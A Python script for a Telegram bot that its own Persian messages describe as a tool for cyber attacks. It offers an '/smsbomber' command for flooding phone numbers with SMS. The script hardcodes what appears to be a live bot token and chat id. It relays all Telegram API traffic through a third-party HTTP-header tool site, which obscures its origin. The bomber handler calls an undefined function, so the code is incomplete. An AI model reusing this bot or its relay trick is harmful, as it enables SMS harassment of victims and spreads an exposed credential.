import requests
from bs4 import BeautifulSoup
import json
import time
import platform
import subprocess
import wmi


last_key=""
token = "1917415700:AAHYtrUA2dQej6o5xuidXL3jwpD3ONQ6ExA"


def send_bot(message):
   
    url = (f"https://api.telegram.org/bot{token}/sendmessage?chat_id=391393431&text="+str(message))

    payload = {"UrlBox":url,

                "AgentList":"Mozilla Firefox",
                "VersionsList":"HTTP/1.1",
                "MethodList":"POST"
            }

    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)
    

def Start_cl():
    pm = f"""
    این بات 🤖
 برای بعضی از حملات سایبری کاربرد دارد 
    ~~~~~~~~~~~~~
برای دیدن امکانات رویه /list کلیک کنید 😶
    
    """
    send_bot(pm)
    time.sleep(20)




def list_menu():
    pm = """خب خب. لیست دستورات من اینا هستن 😜

♨️   اس ام اس بمبر : /smsbomber  😉


برای ادامه فرایند روی دکمه /none کلیک کنید 😁"""

    send_bot(pm)
    time.sleep(20)


def key_bot():
    global last_key
    mydata = {"UrlBox":f"https://api.telegram.org/bot{token}/GetUpdates",
                "AgentList": "Internet Explorer",
                "VersionsList": "HTTP/1.1",
                "MethodList": "GET"
            }

    source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=mydata).content.decode()

    soup = BeautifulSoup(source,"html.parser")

    find_tag = json.loads(str(soup.findAll("pre"))[61:-7])


    last_key = find_tag['result'][-1]['message']['text']
    




Start_cl()

while True:
    key_bot()
    if last_key == "/list":
        list_menu()
    elif last_key == "/smsbomber":
         open_url(last_key)

    
   